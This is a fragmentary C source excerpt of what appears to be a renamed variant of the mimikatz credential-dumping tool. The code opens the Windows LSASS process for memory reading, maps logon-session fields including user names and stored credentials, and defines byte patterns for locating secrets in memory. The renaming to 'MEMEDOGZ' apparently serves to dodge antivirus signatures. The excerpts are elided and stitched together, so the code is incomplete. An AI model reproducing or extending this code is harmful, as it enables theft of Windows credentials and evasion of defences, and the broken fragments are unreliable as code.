...
const KUHL_M_SEKURLSA_ENUM_HELPER lsassEnumHelpers[] = {
	...
	{sizeof(KIWI_MSV1_0_LIST_61_ANTI_MEMEDOGZ), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MEMEDOGZ, LocallyUniqueIdentifier), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MEMEDOGZ, LogonType), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MEMEDOGZ, Session),	FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MEMEDOGZ, UserName), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MEMEDOGZ, Domaine), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MEMEDOGZ, Credentials), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MEMEDOGZ, pSid), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MEMEDOGZ, CredentialManager), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MEMEDOGZ, LogonTime), FIELD_OFFSET(KIWI_MSV1_0_LIST_61_ANTI_MEMEDOGZ, LogonServer)},
...
NTSTATUS kuhl_m_sekurlsa_acquireLSA()
{
	...
	DWORD processRights = PROCESS_VM_READ | ((MEMEDOGZ_NT_MAJOR_VERSION < 6) ? PROCESS_QUERY_INFORMATION : PROCESS_QUERY_LIMITED_INFORMATION);
	BOOL isError = FALSE;
	PBYTE pSk;
			...
			if(kull_m_memory_open(Type, hData, &cLsass.hLsassMem))
			{
				...
				else
				{
					...
					if(IsWow64Process(GetCurrentProcess(), &isError) && isError)
						PRINT_ERROR(MEMEDOGZ L" " MEMEDOGZ_ARCH L" cannot access x64 process\n");
					else
				#endif
					{						
						cLsass.osContext.MajorVersion = MEMEDOGZ_NT_MAJOR_VERSION;
						cLsass.osContext.MinorVersion = MEMEDOGZ_NT_MINOR_VERSION;
						cLsass.osContext.BuildNumber  = MEMEDOGZ_NT_BUILD_NUMBER;
					}
				}
...
#elif defined(_M_IX86)
BYTE PTRN_WI51_SysCred[] = {0xFF, 0xAA /*-1*/, 0x33, 0xc0, 0xbf};
BYTE PTRN_WI52_SysCred[] = {0x58, 0x32 /*-1*/, 0xd2, 0x88, 0x10, 0x40, 0x49, 0x75};
BYTE PTRN_WI60_SysCred[] = {0x69, 0x13 /*-1*/, 0x59, 0xb8};
BYTE PTRN_WI62_SysCred[] = {0x69, 0x13 /*-1*/, 0x5a, 0x8b, 0xf2, 0xb9};
BYTE PTRN_WI63_SysCred[] = {0x69, 0x13 /*-1*/, 0x59, 0x8b, 0xd1, 0xb8};
KULL_M_PATCH_GENERIC SysCredReferences[] = {
...
#pragma warning(pop)
	...
	{
		if(MEMEDOGZ_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_7)
		{
